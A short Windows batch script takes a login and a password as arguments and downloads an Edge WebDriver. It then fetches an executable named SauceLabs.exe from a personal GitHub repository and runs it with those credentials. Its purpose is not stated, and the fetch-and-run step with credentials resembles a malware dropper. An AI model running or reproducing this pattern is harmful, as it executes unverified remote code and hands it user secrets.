set lg=%1
set psw=%2
powershell Invoke-WebRequest -Uri "https://msedgedriver.azureedge.net/100.0.1154.0/edgedriver_win32.zip" -OutFile "C:\Users\Public\Downloads\edgedriver.zip"
powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\edgedriver.zip -DestinationPath C:\Users\Public\Downloads
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
C:\Users\Public\Downloads\saucelabs.exe -e %lg% -p %psw%
